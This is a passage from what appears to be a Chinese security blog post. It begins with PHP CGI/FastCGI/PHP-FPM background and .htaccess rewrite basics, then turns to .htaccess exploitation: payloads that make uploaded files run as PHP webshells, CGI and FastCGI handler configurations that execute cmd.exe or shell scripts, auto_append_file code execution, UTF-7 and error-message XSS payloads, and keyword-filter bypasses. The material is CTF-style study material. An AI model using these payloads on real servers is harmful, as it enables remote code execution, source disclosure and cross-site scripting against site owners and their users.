connection)可以工作。</p></li><li><p>由于FastCGI是多进程，所以比CGI多线程消耗更多的服务器内存，php-cgi解释器每进程消耗7至25兆内存，将这个数字乘以50或100就是很大的内存数。</p></li></ol><h4 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h4><p>要了解PHP-FPM，就得先说说PHP-CGI。</p><p><strong>PHP-CGI就是PHP实现的自带的FastCGI管理器</strong>。 虽然是php官方出品，但是这丫的却一点也不给力，性能太差，而且也很麻烦不人性化，主要体现在：</p><ol><li>php-cgi变更php.ini配置后，需重启php-cgi才能让新的php-ini生效，不可以平滑重启。</li><li>直接杀死php-cgi进程，php就不能运行了。</li></ol><p>上面2个问题，一直让很多人病垢了很久，所以很多人一直还是在用 Module 方式。 直到 2004年一个叫 Andrei Nigmatulin的屌丝发明了PHP-FPM ，这神器的出现就彻底打破了这种局面，这是一个PHP专用的 fastcgi 管理器，它很爽的克服了上面2个问题，而且，还表现在其他方面更表现强劲。</p><p>也就是说，PHP-FPM 是对于 FastCGI 协议的具体实现，他负责管理一个进程池，来处理来自Web服务器的请求。<strong>目前，PHP5.3版本之后，PHP-FPM是内置于PHP的</strong>。</p><p>因为PHP-CGI只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理。所以就出现了一些能够调度 php-cgi 进程的程序，比如说由lighthttpd分离出来的spawn-fcgi。同样，PHP-FPM也是用于调度管理PHP解析器php-cgi的管理程序。</p><p>PHP-FPM通过生成新的子进程可以实现php.ini修改后的平滑重启。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/update.png" alt="img"></p><p>所以，如果要搭建一个高性能的PHP WEB服务器，目前最佳的方式是<strong>Apache/Nginx</strong> + <strong>FastCGI</strong> + **PHP-FPM(+PHP-CGI)**方式了，不要再使用 Module加载或者 CGI 方式啦：）</p><h2 id="0x03-htaccess基本使用"><a href="#0x03-htaccess基本使用" class="headerlink" title="0x03 .htaccess基本使用"></a>0x03 .htaccess基本使用</h2><p>更加完整的文档：</p><ul><li><a href="https://perishablepress.com/stupid-htaccess-tricks/"><a href="https://perishablepress.com/stupid-htaccess-tricks/">Stupid .htaccess Tricks</a></a></li></ul><h3 id="htaccess文件使用前提"><a href="#htaccess文件使用前提" class="headerlink" title=".htaccess文件使用前提"></a>.htaccess文件使用前提</h3><p>.htaccess的主要作用就是实现url改写，也就是当浏览器通过url访问到服务器某个文件夹时，作为主人，我们可以来接待这个url，具体地怎样接待它，就是此文件的作用。所有的访问都是通过URL实现，所以.htaccess的作用非同小可。正因为此，所以一般地网站通过设置.htaccess，通过一个十分友好的url吸引用户进来，然后用.htaccess把用户带到需要访问的位置。</p><p>要想使用这个强大功能，就得开启apache里面的重写模块。</p><p>前面的文章中曾经讲到过<a href="http://www.nbphp.com/blog/windows-ubuntu-open-rewrite-mod-htaccess/">windows和ubuntu开启 rewrite模块使用.htaccess</a> 。</p><p>其实开启模块大体的步骤都是一样的，无论是Windows和linux。</p><h3 id="htaccess基本语法介绍"><a href="#htaccess基本语法介绍" class="headerlink" title=".htaccess基本语法介绍"></a>.htaccess基本语法介绍</h3><p>开启重写引擎 ：RewriteEngine on</p><p>设置重写的根目录：RewriteBase /   — 说明 ：因为定义了这个文件夹，所以对应的替换就有了一个参照。</p><p>匹配所有符合条件的请求：RewriteCond    — 说明：RewriteCond  定义了一系列规则条件，这个指令可以有一条或者多条，只有用户拿来的url符合这些条件之后，我们的.htaccess才开始接待，否则用户就直接自己去访问所需要的目录了。</p><p>举个例子，为了能让搜索引擎更多地抓取我们的网页而避免重复抓，我们通常把没有www的域名重定向到<a href="http://www.XXX.com，如下就实现了这个功能：">www.XXX.com，如下就实现了这个功能：</a></p><p>RewriteEngine On</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute"><span class="hljs-nomarkup">RewriteCond</span></span> <span class="hljs-variable">%&#123;HTTP_HOST&#125;</span>  ^nbphp\.com$<span class="hljs-meta"> [NC]</span><span class="hljs-attribute"><span class="hljs-nomarkup">RewriteRule</span></span> ^(.*)$  http://www.nbphp.com/$<span class="hljs-number">1</span><span class="hljs-meta"> [R=301,L]</span></code></pre></div><p>上例便把nbphp.com 重定向到<a href="http://www.nbphp.com/">www.nbphp.com</a></p><p>%{HTTP_HOST} 是指取得用户访问的URL的主域名  然后空格后面是一个正则表达式匹配，意识就是说是否是 nbphp.com 。</p><p><strong>如果用户访问使用的URL满足所有列出的RewriteCond 提出的条件，那么进行下一步RewriteRule 即开始进行引导</strong>，这才开始实现.htaccess文件的重要功能。</p><p>同样，前面是正则表达式，<strong>用户分析用户的除了主域名nbphp.com之外的URL</strong> ,^(.*)$的意思就是所有的内容。 然后空格后面写的是我们引导用户访问的目录，我们带着他走到新的一个域名上。$1 指的是前面括号里匹配url所得到的内容。</p><p>这样就是一个完整的小例子。关于RewriteCond里 如何调用url的某个部分，我们可以参考这篇文章（<a href="http://blog.csdn.net/keyunq/archive/2008/06/11/2536875.aspx">Apache的Mod_rewrite学习 (RewriteCond重写规则的条件</a>)；</p><p>我们来分析一下 <a href="http://www.phplamp.org/2009/01/discuz7-htaccess-download/">discuz7.0 搜索引擎优化 htaccess </a>里面的重写。</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute"><span class="hljs-nomarkup">RewriteRule</span></span> ^forum-([<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]+)-([<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]+)\.html$  forumdisplay.php?fid=$<span class="hljs-number">1</span>&amp;page=$<span class="hljs-number">2</span></code></pre></div><p>首先加入用户通过 nbphp.com/forum-2-3.html  访问discuz论坛，那么先通过.htaccess过滤，看看是否需要.htaccess引导一下用户，如果满足列出的一系列RewriteCond的条件那么就进行重写，<strong>discuz的没有列出RewriteCond 所以应该全部都进行重写</strong>。所以开始进行转写，forum-2-3.html 这个正好符合  列出的^forum-([0-9]+)-([0-9]+).html$ 正则表达式。并且 $1 为 2  ，$2为3 ，所以代入后面，即  forumdisplay.php?fid=2&amp;page=3 加上前面的RewriteBase  指定的文件目录，那么就带他到制定目录的forumdisplay.php?fid=2&amp;page=3 。</p><h3 id="常见的-htaccess应用举例"><a href="#常见的-htaccess应用举例" class="headerlink" title="常见的.htaccess应用举例"></a>常见的.htaccess应用举例</h3><p><strong>防止盗链，如果来得要访问jpe jpg bmp png结尾的url 用户不是来自我们的网站，那么让他看一张我们网站的展示图片。</strong></p><p>RewriteEngine On</p><p>RewriteCond %{HTTP_REFERER} !^http://(.+.)?mysite.com/ [NC]</p><p>RewriteCond %{HTTP_REFERER} !^$</p><p>RewriteRule .*.(jpe?g|gif|bmp|png)$ /images/nohotlink.jpg [L]</p><p><strong>网站升级的时候，只有特定IP才能访问，其他的用户将看到一个升级页面</strong></p><p>RewriteEngine on</p><p>RewriteCond %{REQUEST_URI} !/upgrade.html$</p><p>RewriteCond %{REMOTE_HOST} !^24.121.202.30</p><p>RewriteRule $ <a href="http://www.nbphp.com/upgrade.html">http://www.nbphp.com/upgrade.html</a> [R=302,L]</p><p><strong>把老的域名转向新域名</strong></p><p># redirect from old domain to new domain</p><p>RewriteEngine On</p><p>RewriteRule ^(.*)$<a href="http://www.yourdomain.com/$1[R=301,L]">http://www.yourdomain.com/$1[R=301,L]</a></p><h3 id="一些其他功能"><a href="#一些其他功能" class="headerlink" title="一些其他功能"></a>一些其他功能</h3><p><strong>引出错误文档的目录</strong></p><p>ErrorDocument 400 /errors/badrequest.html</p><p>ErrorDocument 404  <a href="http://yoursite/errors/notfound.html">http://yoursite/errors/notfound.html</a></p><p>ErrorDocument 401 “Authorization Required</p><p><strong>Blocking users by IP 根据IP阻止用户访问</strong></p><p>order allow,deny</p><p>deny from 123.45.6.7</p><p>deny from 12.34.5. (整个C类地址)</p><p>allow from all</p><p><strong>防止目录浏览</strong></p><p># disable directory browsing</p><p>Options All -Indexes</p><p><strong>设置默认首页</strong></p><p># serve alternate default index page</p><p>DirectoryIndex about.html</p><p><strong>把一些老的链接转到新的链接上——搜索引擎优化SEO</strong></p><p>Redirect 301 /d/file.html<a href="http://www.htaccesselite.com/r/file.html">http://www.htaccesselite.com/r/file.html</a></p><p><strong>为服务器管理员设置电子邮件。</strong></p><p>ServerSignature EMail</p><p>SetEnv <a href="mailto:&#83;&#x45;&#82;&#86;&#x45;&#82;&#95;&#x41;&#x44;&#77;&#73;&#78;&#100;&#101;&#x66;&#97;&#x75;&#x6c;&#116;&#x40;&#x64;&#x6f;&#109;&#x61;&#105;&#x6e;&#46;&#x63;&#111;&#109;">&#83;&#x45;&#82;&#86;&#x45;&#82;&#95;&#x41;&#x44;&#77;&#73;&#78;&#100;&#101;&#x66;&#97;&#x75;&#x6c;&#116;&#x40;&#x64;&#x6f;&#109;&#x61;&#105;&#x6e;&#46;&#x63;&#111;&#109;</a></p><h2 id="0x04-htaccess生效方法"><a href="#0x04-htaccess生效方法" class="headerlink" title="0x04 .htaccess生效方法"></a>0x04 .htaccess生效方法</h2><p><code>vim /etc/apache2/apache2.conf</code></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200910163808808.png" alt="image-20200910163808808"></p><h2 id="0x05-htaccess利用方式"><a href="#0x05-htaccess利用方式" class="headerlink" title="0x05 .htaccess利用方式"></a>0x05 .htaccess利用方式</h2><h3 id="SetHandler-解析利用"><a href="#SetHandler-解析利用" class="headerlink" title="SetHandler 解析利用"></a>SetHandler 解析利用</h3><h4 id="1-解析成php——getshell"><a href="#1-解析成php——getshell" class="headerlink" title="1. 解析成php——getshell"></a>1. 解析成php——getshell</h4><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php</code></pre></div><p>此时当前目录及其子目录下所有文件都会被当做php解析</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01688d340f73299689.png" alt="img"></p><h4 id="2-解析成文本——查看源码"><a href="#2-解析成文本——查看源码" class="headerlink" title="2. 解析成文本——查看源码"></a>2. 解析成文本——查看源码</h4><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">FilesMatch</span> &quot;\<span class="hljs-attr">.php</span>$&quot; &gt;</span>    SetHandler text/plain<span class="hljs-tag">&lt;/<span class="hljs-name">FilesMatch</span>&gt;</span></code></pre></div><p>可以将当前目录下文件都当做文本解析，这样便可获得文件源码</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01384d631cb807c63d.png" alt="img"></p><p>或者用下面的方法：</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">php_flag</span> engine <span class="hljs-number">0</span></code></pre></div><h4 id="3-server-status——监控访问"><a href="#3-server-status——监控访问" class="headerlink" title="3. server-status——监控访问"></a>3. server-status——监控访问</h4><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01fbe1b91fd006c1d6.png" alt="img"></p><p>可添加参数<code>?refresh=5</code>来实现每隔5s自动刷新</p><p>可以监控所有的访问。但是信息不够多，还可以想想有没有附加的配置项。</p><h4 id="4-解析成lua脚本——绕过disable-functions"><a href="#4-解析成lua脚本——绕过disable-functions" class="headerlink" title="4. 解析成lua脚本——绕过disable_functions"></a>4. 解析成lua脚本——绕过disable_functions</h4><p>实际上是执行lua脚本。需要有apache-lua 模块，lua脚本能干的事情都能干，不运行php自然就不需要考虑disable_function的影响。</p><p>handler</p><div class="hljs code-wrapper"><pre><code class="hljs lua"><span class="hljs-built_in">require</span> <span class="hljs-string">&quot;string&quot;</span><span class="hljs-comment">--[[</span><span class="hljs-comment">     This is the default method name for Lua handlers, see the optional</span><span class="hljs-comment">     function-name in the LuaMapHandler directive to choose a different</span><span class="hljs-comment">     entry point.</span><span class="hljs-comment">--]]</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span><span class="hljs-params">(r)</span></span>    r.content_type = <span class="hljs-string">&quot;text/plain&quot;</span>    r:puts(<span class="hljs-string">&quot;Hello Lua World!\n&quot;</span>)    <span class="hljs-keyword">local</span> t = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>)    <span class="hljs-keyword">local</span> a = t:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*all&quot;</span>)    r:puts(a)    <span class="hljs-keyword">if</span> r.method == <span class="hljs-string">&#x27;GET&#x27;</span> <span class="hljs-keyword">then</span>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>( r:parseargs() ) <span class="hljs-keyword">do</span>            r:puts( <span class="hljs-built_in">string</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;%s: %s\n&quot;</span>, k, v) )        <span class="hljs-keyword">end</span>    <span class="hljs-keyword">else</span>        r:puts(<span class="hljs-string">&quot;Unsupported HTTP method &quot;</span> .. r.method)    <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span></code></pre></div><h3 id="CGI启动方式RCE利用"><a href="#CGI启动方式RCE利用" class="headerlink" title="CGI启动方式RCE利用"></a>CGI启动方式RCE利用</h3><p>当我们了解原理后，Apache是需要调用第三方CGI程序，但是一个程序是不是CGI程序这个事很难界定，我们能否通过调用特定的CGI程序(普通程序)来执行任意系统命令呢。答案是可以的。</p><h4 id="mod-cgi-模块"><a href="#mod-cgi-模块" class="headerlink" title="mod_cgi 模块"></a>mod_cgi 模块</h4><p>具有处理程序<code>cgi-script</code>的任何文件都将被视为  CGI 脚本，并由服务器运行，并将其输出返回给 Client 端。文件通过具有包含由<a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_mime.html#addhandler">AddHandler</a>指令定义的 extensions 的名称或位于<a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_alias.html#scriptalias">ScriptAlias</a>目录中来获取此处理程序。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><blockquote><p>​    1.保证htaccess会被解析，即当前目录中配置了`AllowOverride all或AllowOverride Options FileInfo。AllowOverride参数具体作用可参考Apache之AllowOverride参数详解。(Require all granted也是需要的)</p><p>​    2.cgi_module被加载。即apache配置文件中有LoadModule cgi_module modules/mod_cgi.so这么一句且没有被注释。</p><p>​    3.有目录的上传、写入权限。</p></blockquote><h4 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h4><p>上传.htaccess  文件, 内容如下：</p><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">Options ExecCGI<span class="hljs-keyword">AddHandler </span>cgi-<span class="hljs-keyword">script </span>.xx</code></pre></div><p>Options ExecCGI表示允许CGI执行，如果AllowOverride只有FileInfo权限且本身就开启了ExecCGI的话，就可以不需要这句话了。</p><p>Options +ExecCGI 作用相同。</p><p>第二句告诉Apache<strong>将xx后缀名的文件，当做CGI程序进行解析</strong>。</p><p>windows，上传poc.xx文件，内容如下：</p><div class="hljs code-wrapper"><pre><code class="hljs d"><span class="hljs-meta">#!C:/Windows/System32/cmd.exe /c start calc.exe</span></code></pre></div><p>linux，</p><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-built_in">echo</span> Content-type: text/html<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span>cat /flag</code></pre></div><p>这里需要注意脚本的格式，不知道为什么，这里去掉echo “”就无法执行成功，可能与cgi脚本的格式有关系。</p><p>linux环境下，也是随你玩，是直接调用**/bin/bash<strong>还是调用</strong>/usr/bin/python**来反弹Shell。都是可以的。这其实也就是正常使用方式，因为Python也会被用作为CGI解析程序。</p><h3 id="FastCGI启动方式RCE利用"><a href="#FastCGI启动方式RCE利用" class="headerlink" title="FastCGI启动方式RCE利用"></a>FastCGI启动方式RCE利用</h3><p>​    我们再来看看FastCGI模式的，这个依赖的是mod_fcgid.so，默认安装包里甚至没有这个so文件，不过在PHPStudy的默认配置中，就已经是加载了的，并且AllowOverride也是All权限，手动斜眼。</p><p>​    其实还有mod_proxy_fcgi，更为常见，也是默认开启的，还不清楚能否利用，表哥表姐们可以尝试一下。</p><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><blockquote><p>1.AllowOverride all或AllowOverride Options FileInfo。</p><p>2.mod_fcgid.so被加载。即apache配置文件中有LoadModule fcgid_module modules/mod_fcgid.so</p><p>3.有目录的上传、写入权限。</p></blockquote><h4 id="利用姿势-1"><a href="#利用姿势-1" class="headerlink" title="利用姿势"></a>利用姿势</h4><p>上传.htaccess  文件, 内容如下：</p><div class="hljs code-wrapper"><pre><code class="hljs dos">Options +ExecCGIAddHandler fcgid-script .abcFcgidWrapper &quot;C:/Windows/System32/<span class="hljs-built_in">cmd</span>.exe /c <span class="hljs-built_in">start</span> <span class="hljs-built_in">cmd</span>.exe&quot; .abc</code></pre></div><p>老样子，如果默认就开启了ExecCGI，则第一句可以省略。</p><p>第二句表示，abc后缀名的文件需要被fcgi来解析。AddHandler还可以换成AddType。</p><p>再上传1.abc。内容无所谓。</p><h3 id="proxy-fcgi启动方式RCE利用"><a href="#proxy-fcgi启动方式RCE利用" class="headerlink" title="proxy_fcgi启动方式RCE利用"></a>proxy_fcgi启动方式RCE利用</h3><h3 id="使用相对路径"><a href="#使用相对路径" class="headerlink" title="使用相对路径"></a>使用相对路径</h3><p>其实一些小伙伴也已经发现了，上面的问题再配合有上传漏洞，我甚至可以穿个马上去。但是无论是CGI还是FastCGI似乎都是绝对路径，相对路径可不可以呢？</p><p>经过了一些尝试，并请教了”裤衩哥”,发现相对路径也是可以的，起始点似乎和session.save_path变量的值是一致的。如图，比如phpstudy当中，起始点就是在\Extensions\tmp\tmp中。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1572427454_5db956be0a967.png!small" alt="image.png"></p><h4 id="1-解析成php"><a href="#1-解析成php" class="headerlink" title="1. 解析成php"></a>1. 解析成php</h4><p>那么，比如说我想要html后缀使用php来解析。就可以这样写。</p><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">AddHandler fcgid-script <span class="hljs-string">.html</span>FcgidWrapper <span class="hljs-string">&quot;../../php/php7.3.4nts/php-cgi.exe&quot;</span> <span class="hljs-string">.html</span></code></pre></div><p>再来，我想调用网站根目录的calc.exe。可以这样。</p><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">AddHandler fcgid-script <span class="hljs-string">.xx</span>FcgidWrapper <span class="hljs-string">&quot;../../../WWW/localhost/calc.exe&quot;</span> <span class="hljs-string">.xx</span></code></pre></div><p>不过计算器无法正常弹出。23333 我猜应该是因为calc毕竟不是个标准CGI程序导致的吧。而且也没必要绕这么大个圈子，就没继续测试了。</p><h3 id="AddType-文件类型解析利用"><a href="#AddType-文件类型解析利用" class="headerlink" title="AddType 文件类型解析利用"></a>AddType 文件类型解析利用</h3><h4 id="1-解析成php-1"><a href="#1-解析成php-1" class="headerlink" title="1. 解析成php"></a>1. 解析成php</h4><div class="hljs code-wrapper"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .a</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200911085755821.png" alt="image-20200911085755821"></p><h4 id="2-php-value-配置选项利用"><a href="#2-php-value-配置选项利用" class="headerlink" title="2. php_value 配置选项利用"></a>2. php_value 配置选项利用</h4><p>这种方式可通过<code>php_value</code>来配置PHP的配置选项；</p><p>查看<a href="https://www.php.net/manual/zh/configuration.changes.modes.php">配置可被设定的范围</a>：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t0142ecdfc9bc4dea2c.png" alt="img"></p><p>从上图可知，.htaccess可以使两种配置模式生效：<code>PHP_INI_PREDIR</code>和<code>PHP_INI_ALL</code></p><p>可查看<a href="https://www.php.net/manual/zh/ini.list.php">php.ini配置选项列表</a>，从中寻找可利用的配置项</p><h5 id="2-1-使用文件包含的两个相关配置"><a href="#2-1-使用文件包含的两个相关配置" class="headerlink" title="2.1 使用文件包含的两个相关配置"></a>2.1 使用文件包含的两个相关配置</h5><ul><li><code>auto_prepend_file</code>：指定一个文件，在主文件解析之前自动解析</li><li><code>auto_append_file</code>：指定一个文件，在主文件解析后自动解析</li></ul><p>编辑.htaccess，内容为：</p><div class="hljs code-wrapper"><pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_prepend_file webshell</code></pre></div><p>编辑<code>webshell</code>，内容为：</p><div class="hljs code-wrapper"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span>phpinfo();</code></pre></div><p>此时随便找一个php文件访问：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01bd4392c622f18276.png" alt="img"></p><p><strong>然后就是各种文件包含的操作</strong></p><p>由于通过设置这两个选项进行文件包含，那么便可使用相关的php协议流，如<code>php://filter</code>，可用来绕过对一些关键字的检测</p><h5 id="2-2-绕过preg-match利用"><a href="#2-2-绕过preg-match利用" class="headerlink" title="2.2 绕过preg_match利用"></a>2.2 绕过preg_match利用</h5><p>查看官方文档中的相关配置：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01e72385d9b9ab2b2d.png" alt="img"></p><p>编辑.htaccess：</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">php_value</span> pcre.backtrack_limit <span class="hljs-number">0</span><span class="hljs-attribute">php_value</span> pcre.jit <span class="hljs-number">0</span></code></pre></div><p>测试：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01c94eb522a6e0f5ca.png" alt="img"></p><h3 id="使-htaccess文件可访问"><a href="#使-htaccess文件可访问" class="headerlink" title="使.htaccess文件可访问"></a>使.htaccess文件可访问</h3><p>默认情况下，.htaccess是不可访问的：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01cac6209710b84ed5.png"></p><p>那么编辑.htaccess文件，添加如下配置：</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-section">&lt;Files ~ <span class="hljs-string">&quot;^.ht&quot;</span>&gt;</span>    <span class="hljs-attribute">Require</span> <span class="hljs-literal">all</span> granted    <span class="hljs-attribute"><span class="hljs-nomarkup">Order</span></span> <span class="hljs-literal">allow</span>,<span class="hljs-literal">deny</span>    <span class="hljs-attribute"><span class="hljs-nomarkup">Allow</span></span> from <span class="hljs-literal">all</span><span class="hljs-section">&lt;/Files&gt;</span></code></pre></div><p>测试：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01a24ca8a58e2fa4ec.png" alt="img"></p><h3 id="htaccess-shell-与-XSS"><a href="#htaccess-shell-与-XSS" class="headerlink" title=".htaccess shell 与 XSS"></a>.htaccess shell 与 XSS</h3><p>例如下面这个.htaccess文件，首先设置了禁用拒绝规则，这样便可直接访问到.htaccess；接着用<code>SetHandler</code>将所有文件作为php解析，最后写入php代码，开头用<code>#</code>注释掉，这样便可成功解析.htaccess，然后解析php：</p><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Files</span> ~ &quot;^<span class="hljs-attr">.ht</span>&quot;&gt;</span> Require all granted Order allow,deny Allow from all<span class="hljs-tag">&lt;/<span class="hljs-name">Files</span>&gt;</span>SetHandler application/x-httpd-php# &lt;?php phpinfo(); ?&gt;</code></pre></div><p>相关的关于.htaccess的shell，可参考github上一个项目：里面有各种语言的shell。</p><p><a href="https://github.com/wireghoul/htshells">https://github.com/wireghoul/htshells</a></p><h4 id="php-code-execution"><a href="#php-code-execution" class="headerlink" title="php code execution"></a>php code execution</h4><p>index.php: (empty)</p><p>.htaccess:</p><div class="hljs code-wrapper"><pre><code class="hljs php-template"><span class="xml">php_value auto_append_file .htaccess</span><span class="xml">#</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();</span></code></pre></div><h4 id="direct-remote-file-inclusion（不可用）"><a href="#direct-remote-file-inclusion（不可用）" class="headerlink" title="(direct/remote) file inclusion（不可用）"></a>(direct/remote) file inclusion（不可用）</h4><p>index.php: (empty)</p><p>.htaccess:</p><div class="hljs code-wrapper"><pre><code class="hljs lasso">php_flag allow_url_include <span class="hljs-number">1</span>php_value auto_append_file <span class="hljs-built_in">data</span>:<span class="hljs-comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span>#php_value auto_append_file <span class="hljs-built_in">data</span>:<span class="hljs-comment">//text/plain,%3C%3Fphp+phpinfo%28%29%3B</span>#php_value auto_append_file https:<span class="hljs-comment">//sektioneins.de/evil-code.txt</span></code></pre></div><p>打开allow_url_include 后，可以直接远程文件包含，也可以用data协议getshell</p><p><strong>查阅文档后发现allow_url_include不可用htaccess来进行修改</strong></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200912102329350.png" alt="image-20200912102329350"></p><p>此项无效</p><h4 id="XSS-and-PHP-code-execution-with-UTF-7"><a href="#XSS-and-PHP-code-execution-with-UTF-7" class="headerlink" title="XSS and PHP code execution with UTF-7"></a>XSS and PHP code execution with UTF-7</h4><p>index.php: (empty)</p><p>.htaccess:</p><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">php_flag zend.<span class="hljs-keyword">multibyte </span><span class="hljs-number">1</span>php_value zend.<span class="hljs-keyword">script_encoding </span><span class="hljs-string">&quot;UTF-7&quot;</span>php_value auto_append_file .htaccess<span class="hljs-comment">#+ADw-script+AD4-alert(1)+ADsAPA-/script+AD4 #+ADw?php phpinfo()+ADs</span></code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200912102552476.png" alt="image-20200912102552476"></p><p><code>+ADw-script+AD4-alert(1)+ADsAPA-/script+AD4</code></p><p>解码后为</p><p><code>&lt;script&gt;alert(1);&lt;/script&gt;</code></p><h4 id="XSS-via-error-message-link-extension"><a href="#XSS-via-error-message-link-extension" class="headerlink" title="XSS via error message link extension"></a>XSS via error message link extension</h4><p>index.php:</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;foo&#x27;</span>);</code></pre></div><p>.htaccess:</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">php_flag</span> display_errors <span class="hljs-number">1</span><span class="hljs-attribute">php_flag</span> html_errors <span class="hljs-number">1</span><span class="hljs-attribute">php_value</span> docref_root <span class="hljs-string">&quot;x&quot;</span><span class="hljs-attribute">php_value</span> docref_ext <span class="hljs-string">&quot;&lt;script&gt;alert(1);&lt;/script&gt;&quot;</span></code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200912103938003.png" alt="image-20200912103938003"></p><h4 id="XSS-via-highlight-file-color"><a href="#XSS-via-highlight-file-color" class="headerlink" title="XSS via highlight_file() color"></a>XSS via highlight_file() color</h4><p>index.phps:</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">// comment</span><span class="hljs-meta">?&gt;</span></code></pre></div><p>.htaccess:</p><div class="hljs code-wrapper"><pre><code class="hljs xml">php_value highlight.comment &#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&#x27;</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200912103730890.png" alt="image-20200912103730890"></p><h4 id="Source-code-disclosure（直接查看源码）"><a href="#Source-code-disclosure（直接查看源码）" class="headerlink" title="Source code disclosure（直接查看源码）"></a>Source code disclosure（直接查看源码）</h4><p>.htaccess:</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">php_flag</span> engine <span class="hljs-number">0</span></code></pre></div><h2 id="0x06-Bypass方式"><a href="#0x06-Bypass方式" class="headerlink" title="0x06 Bypass方式"></a>0x06 Bypass方式</h2><h3 id="1-关键字检测"><a href="#1-关键字检测" class="headerlink" title="1.关键字检测"></a>1.关键字检测</h3><h4 id="1-1-过滤了-htaccess常用的关键字"><a href="#1-1-过滤了-htaccess常用的关键字" class="headerlink" title="1.1 过滤了.htaccess常用的关键字"></a>1.1 过滤了.htaccess常用的关键字</h4><p>如果过滤了.htaccess常用的关键字，此时可以使用反斜线来绕过对关键字的过滤，反斜线后需要加上换行符，并且反斜线前和关键字无空格</p><p>例如：</p><div class="hljs code-wrapper"><pre><code class="hljs applescript">AddT\ype <span class="hljs-built_in">application</span>/x-httpd-php .abc</code></pre></div><h4 id="1-2-过滤了-lt-等php字符串"><a href="#1-2-过滤了-lt-等php字符串" class="headerlink" title="1.2 过滤了&lt;?等php字符串"></a>1.2 过滤了<code>&lt;?</code>等php字符串</h4><p>如果检测不能含有<code>&lt;?</code>等php字符串，那么此时可先将shell字符串进行编码，然后在文件包含时通过<code>php://filter</code>解码：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t0131a681178bf98a67.png" alt="img"></p><div class="hljs code-wrapper"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-decode/</span>resource=<span class="hljs-number">2</span>.abc</code></pre></div><p>也可以直接写在htaccess文件中</p><div class="hljs code-wrapper"><pre><code class="hljs applescript">AddType <span 